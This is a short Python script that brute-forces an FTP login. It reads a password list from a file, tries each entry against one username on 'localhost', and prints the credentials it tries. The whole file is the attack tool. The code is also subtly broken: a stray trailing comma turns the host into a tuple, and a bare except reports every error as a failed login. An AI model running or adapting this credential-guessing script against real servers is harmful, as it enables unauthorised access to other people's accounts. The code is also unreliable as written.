from ftplib import FTP

def attempt_ftp_login(host, username, password):
    ftp = FTP(host)
    try:
        ftp.login(username, password)
        print(f"Login successful with {username}:{password}")
        ftp.quit()
        return True
    except:
        print(f"Failed login with {username}:{password}")
        return False

def crack_password(host, username, passwords):
    for password in passwords:
        if attempt_ftp_login(host,username,password):
            break

def read_password(file):
    with open(file, 'r') as f:
        passwords = f.read().splitlines()
    return passwords


host = 'localhost',
username = 'user'
# passwords = ['1234', 'secret', 'password']
passwords = read_password("passwords.txt")

crack_password(host,username,passwords)